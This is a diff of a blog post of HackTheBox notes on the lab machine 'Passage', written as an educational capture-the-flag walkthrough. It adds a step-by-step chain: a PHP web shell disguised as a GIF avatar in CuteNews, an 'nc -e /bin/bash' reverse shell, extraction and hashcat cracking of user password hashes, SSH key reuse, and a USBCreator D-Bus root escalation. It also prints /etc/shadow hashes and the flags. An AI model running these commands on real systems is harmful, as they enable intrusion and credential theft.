@@ -7,6 +7,34 @@ title: HackTheBox Notes &mdash; Passage
 
 This machine is currently active, and is my first attempt at HTB.  Its IP address is `10.10.10.206`.
 
+# The Short Version
+  1.  Run `nmap -sC -sV 10.10.10.206` to get the open ports;
+  2.  Run `echo "10.10.10.206    passage" | sudo tee -a /etc/hosts` to get a nicer way to reference the machine;
+  3.  Go to `http://passage:80` on your browser.  Notice it uses CuteNews;
+  4.  Go to `http://passage:80/CuteNews/` and create an account;
+  5.  Edit your account by uploading an avatar "photo", which is really just a file containing:
+    ```
+    GIF8;
+    <?php system($_REQUEST['cmd']) ?>
+    ```
+  6.  Go to `http://passage:80/CuteNews/uploads/`, and click on your recently uploaded PHP file;
+  7.  Run `nc -nlvp 1234` in a terminal window;
+  8.  Get the IP address of your `tun0` interface: `ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'`;
+  9.  Append the URL of your upload with `?cmd=nc -e /bin/bash <IP from step 8> 1234`;
+  10. Go back to your terminal and run `python3 -c 'import pty; pty.spawn("/bin/bash")'` to gain access to a shell;
+  11. Now that you have access, you need some passwords.  There are some hashed passwords, encoded using `base64`, in the `/var/www/html/CuteNews/cdata/users/` directory.  You will need to get each of their hashes where possible: you can do some *quick and dirty* bash parsing to get the usernames and hashes:
+    ```
+    for i in /var/www/html/CuteNews/cdata/users/*.php; do DECODED="$(tail -n 1 "$i" | base64 -d 2>/dev/null)"; RET_VAL=$?; if [ $RET_VAL -eq 0 ]; then HASH="$(echo "$DECODED" | awk -F'64:' '{print $2}' | awk -F';' '{print $1}' | tr -d '"' | sed '/^$/d')"; if [[ ! -z "${HASH}" ]]; then NAME="$(echo "$DECODED" | awk -F'"email"' '{print $2}' | awk -F'@' '{print $1}' | awk -F'"' '{print $2}' | tr -d '"' | sed '/^$/d')"; echo -e "${NAME}\n${HASH}\n"; fi; fi; done
+    ```
+    You could also parse the `/var/www/html/CuteNews/cdata/users/lines` file using `while read`, as I think that has the same content.
+  12. You will now need to choose a hash and decode it.  For me, `paul`'s hash worked.  I checked `hash-identify` to see that it was likely `SHA-256`, and thus ran `hashcat -a 0 -m 1400 "$OUR_HASH" /usr/share/wordlists/rockyou.txt && hashcat --show -m 1400 "$OUR_HASH"`: we see the password is `atlanta1`.  (Thank you, Paul, for having a terrible password);
+  13. Login as Paul; `su paul`&mdash;using the password we found above.  Capture an intermediate flag: `cat ~/user.txt`;
+  14. As Paul seems to have access to admin's (`nadav`'s) account via `ssh`, we can run `ssh -i ~/.ssh/id_rsa nadav@passage`; now we are pretending to be `nadav`;
+  15. Now we are admin, making use of a vulnerability in the USBCreator D-Bus interface that allows privilege escalation, we can gain root access to this machine by running `cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true && ssh -i pwn root@passage`;
+  16. Capture the "flag": `cat /root/root.txt`.
+
+# The Long (Verbatim) Version
+
 After pinging it, I have run
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -77,9 +105,7 @@ I came to a realisation: why can't I simply google what I want.  I searched `com
 [link=javascript://%0adocument.write('<script>alert(/xss/)</script>')]funny pictures[/link]
 ```
 
-[link=javascript://%0adocument.write('<script>window.open("http://passage/index.php?regusername=a&regpassword=a&regnickname=a&regemail=a%40a.com&reglevel=1&action=adduser&mod=editusers","_self")</script>')]funny pictures[/link]
-
-[Project options > Misc > Embedded Browser > Allow the embedded browser to run without a sandbox](https://hooya0011.tistory.com/84)
+Note: you can allow embedded browsers to run without sandbox for BurpSuite by doing [Project options > Misc > Embedded Browser > Allow the embedded browser to run without a sandbox](https://hooya0011.tistory.com/84).  I was going to use BurpSuite for this task, but I found other avenues, though this will likely come up in the future.
 
 After trying a lot of those exploits, I appended my search with `git`, and found [this repo](https://github.com/CRFSlick/CVE-2019-11447-POC), which I cloned.  I then made a CuteNews account for Passage by putting `/CuteNews/` before `index.php`, and logged into CuteNews using this python script, and uploaded the evil image (`sad.gif`).  This gave me a reverse shell, but it wasn't quite what I wanted; every command I ran gave me a bunch of HTML.  I needed to find a similar exploit, but this one wasn't working.
 
@@ -145,6 +171,8 @@ Dropping to a SHELL
 
 command >
 ```
+
+This exploit uploads PHP code as your profile picture.
 
 I ran `ls /home/` and saw the users `nadav` (that admin we noted earlier) and `paul`; neat!  I recall that there is an `ssh` port open, so I try to make a user for myself (I have done this before; it is trivial for Linux users).  The only tricky thing is that this shell is very minimal and only has `stdout`, I believe.  To get around this, I might show everything as stdout by
 ```bash
@@ -456,8 +484,112 @@ $ ssh paul-coles@10.10.10.206 -p 22
 paul-coles@10.10.10.206: Permission denied (publickey).
 ```
 
-Hmm.  Stuck again.
+Hmm.  Stuck again.  Best try to get a better web shell, and try to access Paul's account via that.  Let us backtrack and reupload this file.  The file we will upload (manually, this time), will look like the following:
+```php
+GIF8;
+<?php system($_REQUEST['cmd']) ?>
+```
+After uploading this, we can see this file in `http://passage:80/CuteNews/uploads/`.  Going to that link, and clicking on out PHP shell file upload, we get to a page that simply says `GIF8;`.  We need to append the URL to do something clever; but first we need to run `ifconfig` or `ip a` to get the IP address of your `tun0` interface (in my case, this was `10.10.14.239`).  If you don't see this interface, ensure you are running the VPN on the VM, and not your main computer, as I figured out the hard way...
 
+So now we have this IP address, and we choose a 4-digit port number (say, `1234`), we can append the URL to look like the following:
+```
+http://passage/CuteNews/uploads/avatar_Christopher Tatlock_shell.php?cmd=nc -e /bin/bash 10.10.14.239 1234
+```
+*But wait*: before you hit <kbd>Enter</kbd>, you need to go into a terminal, and enter the following command:
+```
+nc -nlvp 1234
+```
+And run that.  This will look for any connections on the `tun0` interface and intercept them.  Now you can press <kbd>Enter</kbd> in the browser window, and you will see in your terminal that this has been intercepted.  Now in terminal, you can enter a python command which will give you access to a web shell:
+```bash
+python3 -c 'import pty; pyt.spawn("/bin/bash")'
+```
+
+Now we have access to this web shell again, though this one is much better; it has a stderr, and thinks it has access to tty.  So now we can type `su paul` and login to his account using our decrypted hashed password, and we are now pretending to be Mister Paul Coles on this machine.
+
+My first instict is to go to the home directory; the most familiar part of linux systems to everyone.  In there I find a `user.txt` file.  I see what's inside and it looks like another hash:
+```
+paul@passage:~$ cat user.txt    
+cat user.txt
+592dbc85750aec2f97786b6ff1fe9269
+```
+
+`hash-identify` thinks it might be a `MD4` or `Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))`, but `hashcat` doesn't produce much.  
+
+I then recall that there is an `ssh` port open; that can't be a mistake.  I go into Paul's `ssh` hidden directory, and run
+```bash
+ssh -i id_rsa nadav@passage
+```
+
+This gives me access to `nadav` (admin's) account without needing his password, as the RSA key Paul has works!
+
+This is great; we have admin access to this machine.  Now what I need to do is just remember what exactly we are supposed to be doing...  That's right; we need `root` access *specifically*; not just admin access.  After some Googling, it looks like there is [a vulnerability in the USBCreator D-Bus interface that allows privilege escalation using](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) 
+
+```bash
+cd /tmp && gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/pwn true
+```
+
+Now we can run
+
+```bash
+ssh -i pwn root@passage
+```
+
+And we have root access!  In the `/root` file there is another text file with what looks like another hash:
+```
+root@passage:~# cat root.txt    
+cat root.txt
+c02216e9d3cc7e27a9d36d031ea98a65
+root@passage:~# pwd
+pwd
+/root
+```
+
+Now we can even see the hashed passwords file!
+```
+sudo cat /etc/shadow
+root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:17954:0:99999:7:::
+uuidd:*:17954:0:99999:7:::
+lightdm:*:17954:0:99999:7:::
+whoopsie:*:17954:0:99999:7:::
+avahi-autoipd:*:17954:0:99999:7:::
+avahi:*:17954:0:99999:7:::
+dnsmasq:*:17954:0:99999:7:::
+colord:*:17954:0:99999:7:::
+speech-dispatcher:!:17954:0:99999:7:::
+hplip:*:17954:0:99999:7:::
+kernoops:*:17954:0:99999:7:::
+pulse:*:17954:0:99999:7:::
+rtkit:*:17954:0:99999:7:::
+saned:*:17954:0:99999:7:::
+usbmux:*:17954:0:99999:7:::
+nadav:$6$D30IVulR$vENayGqKX8L0RYB/wcf7ZMfFHyCedmEIu4zXw7bZcH3GBrCrBzHJ3Y/in96pthdcp5cU.0UTXobQLu7T0INzk1:18464:0:99999:7:::
+paul:$6$cpGlwRS2$AhcQyxAskjvAQtS4vpO0VgNW0liHRbLSosZlrHpzL3XTfPHmeDL7hWkut1kCjgNnEHIdU9J019hQTAMH6nzxe1:18464:0:99999:7:::
+sshd:*:18464:0:99999:7:::
+```
 
 ---
 
